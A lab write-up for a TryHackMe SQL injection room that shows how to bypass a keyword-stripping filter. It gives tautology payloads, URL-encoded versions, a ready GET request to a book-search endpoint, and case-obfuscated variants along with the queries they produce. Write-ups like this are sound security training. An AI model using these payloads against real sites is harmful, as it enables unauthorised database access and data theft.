# TryHackMe Advanced SQL Injection

{% embed url="https://tryhackme.com/room/advancedsqlinjection" %}



### Task 4: Filter Evasion Techniques

Given the simple SQL query performed on the server:

```sql
SELECT * FROM books WHERE book_name = '[book_name]'
```

We can attempt to trick the system into providing us more information, by injecting the following payload:

```sql
' OR 1=1 --
```

The following code snippet displays a simple SQLi prevention mechanism where the application simply removes a few important keywords:

<figure><img src="../../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Thus, this causes the final SQL command to not work, as the `OR` keyword will be removed. However, it can be easily bypassed by methods such as URL encoding the payload, or obfuscating the keywords.&#x20;



**URL encode**

We can URL encode the following payload using the [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)) tool:

```sql
' || 1=1 --+
```

* `'`: Closes the current value
* `||`: Substitute value for OR
* `1=1`: Always true
* `--`: Comment in SQL, forcing the database to ignore the rest of the query
* `+`: Adds a space after the comment to ensure that it is properly terminated



The URL encoded format is as follows:

```sql
'%20%7C%7C%201=1%20--+
```

To prevent any further issues with the formatting, we can analyze the HTTP request made for the query, and directly insert the payload instead. In this example, a GET request to `/search_books.php?book_name=<payload>` is made for each request.

Thus, we can send a GET request to `/search_books.php?book_name=%27%20%7C%7C%201=1%20--+` to retrieve a list of all books in the table.



**Obfuscating the keywords**

Obfuscation of keywords involves changing around the capitalization of the keywords:

Eg.&#x20;

`OR` -> `oR`, `Or`&#x20;

`OR` -> `||`



The following presents a few payloads we can use to bypass the filter mechanism:

1. `' Or '1=1` -> `SELECT * FROM books WHERE book_name = '' Or '1=1'`

<figure><img src="../../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

2. `' Or 1=1 oR '` -> `SELECT * FROM books WHERE book_name = '' Or 1=1 oR ''`&#x20;
3. `' Or 1=1--` -> `SELECT * FROM books WHERE book_name = '' Or 1=1-- '`&#x20;
   * Take note of the space after the comment (`--`)
4. `' || '1=1`-> `SELECT * FROM books WHERE book_name = '' || '1=1'`
   * Replacing `OR` with `||` works too

